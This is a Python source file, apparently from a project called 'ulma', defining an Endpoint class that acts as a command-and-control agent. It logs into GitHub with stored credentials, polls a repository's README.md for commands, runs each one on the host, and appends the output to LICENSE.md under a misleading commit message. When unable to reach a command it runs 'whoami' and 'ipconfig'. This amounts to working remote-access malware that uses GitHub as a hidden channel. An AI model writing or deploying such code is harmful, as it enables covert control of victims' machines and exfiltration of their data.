from __future__ import absolute_import
from __future__ import print_function

import github3

from time import sleep
from ulma.utils import Utils
from ulma.system import System

class Endpoint:

    def __init__(self):
        self.last_command = None
        self.user = None
        self.repo = None
        self.results = None
        self.upload = ""
        self.command_executed = 0
        self.utils = Utils()
        self.system = System()
        self.set_endpoint()

    def set_endpoint(self):
        if self.utils.get_mode() == "online":    
            with open("creds.txt", "r") as f:
                content = f.readlines()[0]

            self.user = content.split(":")[0]
            token = content.split(":")[1]
            self.endpoint = github3.login(self.user, token)

        else:
            self.endpoint = None
    
    def get_repo(self):
        if self.endpoint is not None:
            self.repo = self.endpoint.repository(self.user, "command")
        else:
            self.set_endpoint()
            return "Error: can't connect to Internet."
    
    def handle_command(self, command):
        if command != self.last_command:
            self.last_command = command
            self.command_executed += 1
            self.results = self.system.execute([command])
            print("Actual command: " + command)

        if self.command_executed == 3:
            self.command_executed = 0
            self.upload_content()
    
    def receive_command(self):
        while True:
            if self.repo is not None:
                command = self.repo.file_contents("README.md").decoded.decode('utf-8').strip("\n")
                self.handle_command(command)
            else:
                self.get_repo()
                self.basic_commands()

            sleep(10)

    def upload_content(self):
        if self.repo is not None:
            self.set_upload()
            if len(self.upload) > 0:
                final = self.repo.file_contents("LICENSE.md").decoded.decode('utf-8') + self.upload
                self.repo.file_contents("LICENSE.md").update('udpate LICENSE.md', final.encode('utf-8'))
                self.upload = ""

    def set_upload(self):
        for result in self.results:
            self.upload += result

    def basic_commands(self):
        commands = ["whoami", "ipconfig"]
        self.results = self.system.execute(commands)
        self.upload_content()
